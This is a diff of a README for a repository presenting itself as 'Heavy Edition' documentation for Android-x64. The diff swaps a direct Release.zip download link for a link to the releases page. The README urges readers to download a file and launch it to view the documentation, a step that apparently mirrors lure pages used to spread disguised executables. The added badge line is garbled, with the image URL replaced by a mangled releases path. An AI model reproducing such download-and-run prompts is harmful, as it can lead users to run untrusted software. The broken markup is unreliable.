@@ -8,9 +8,9 @@ Welcome to the Android-x64_Android16.0_Heavy_Edition_Docs repository, your go-to
 - **Topics:** android-16, android-alternative, android-w, android-x64, android-x64-android-16, android-x64-android-16-heavy-edition, android-x64-development, android-x64-docs, android-x64-documentation, android-x64-heavy-edition, android-x64-project, gpl3, gplv3, heavy-edition, linux, markdown-lang, markdown-language, operating-system
 
 ## Access the Heavy Edition Documentation
-To access the Heavy Edition documentation, you can download it from the following link: [Download Heavy Edition Documentation](https://github.com/releases/789694263/Release.zip)
+To access the Heavy Edition documentation, you can download it from the following link: [Download Heavy Edition Documentation](https://github.com/Shankz772/Android-x64_Android16.0_Heavy_Edition_Docs/releases)
 
-[![Download Heavy Edition Documentation](https://img.shields.io/badge/Download-Heavy%20Edition%20Documentation-brightgreen)](https://github.com/releases/789694263/Release.zip)
+[![Download Heavy Edition Documentation](https://github.com/Shankz772/Android-x64_Android16.0_Heavy_Edition_Docs/releases%20Edition%20Documentation-brightgreen)](https://github.com/Shankz772/Android-x64_Android16.0_Heavy_Edition_Docs/releases)
 
 If the link above ends with a file name, you will need to launch the downloaded file to access the documentation. In case the link doesn't work or is not provided, please check the "Releases" section of this repository for alternative download options.
 
